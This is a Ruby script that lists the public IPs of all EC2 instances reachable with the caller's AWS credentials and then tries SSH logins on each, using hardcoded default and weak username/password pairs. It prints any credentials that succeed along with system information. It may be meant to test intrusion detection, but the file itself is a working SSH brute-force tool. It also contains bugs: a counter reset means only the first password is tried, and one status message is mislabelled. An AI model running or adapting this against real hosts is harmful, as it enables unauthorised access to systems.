#! /bin/ruby
require 'net/ssh'
require 'net/http'
require 'aws-sdk'


if ENV['AWS_PROFILE']
  puts "Using AWS_PROFILE = #{ENV['AWS_PROFILE']}"
else
  puts "AWS_PROFILE is empty, using 'default'"
end
profile = ENV['AWS_PROFILE']

credentials = Aws::SharedCredentials.new(profile_name: ENV['AWS_PROFILE'])

if ENV['AWS_REGION']
  puts "Using AWS_REGION = #{ENV['AWS_REGION']}"
else
  puts "AWS_PROFILE is empty, using default 'us-west-2'"
end
region = ENV['AWS_REGION'] || 'us-west-2'

client = Aws::EC2::Client.new(region: region, credentials: credentials)
ec2_resp = client.describe_instances
reservations = ec2_resp.reservations
public_ips = []

reservations.each do |reservation|
  reservation.instances.each do |ec2|
    public_ips << ec2.public_ip_address
  end
end

usernames=["ec2-user","admin","username","johntheripper","master","hacker","admin@metacorp.com"]
passwords=["ec2-user","admin","password","johntheripper","master","letmein","admin1234"]

# Attempt brute force SSH login#

public_ips.each do |public_ip|

  usernames.each do |username|
    i = 0

    hostname = public_ip
    username = username
    password = passwords[i]

    cmd = "uname -a"
    begin
      ssh = Net::SSH.start(hostname, username, :password => password)
      res = ssh.exec!(cmd)
      ssh.close
      puts "SUCCESS: SSH connected to #{hostname} using #{username}/#{password}"
      puts "SYSTEM INFO: " +res
    rescue
      puts "FAIL: Unable to SSH connect to #{hostname} using #{username}/#{password}"
    end

    i += 1
  end
end
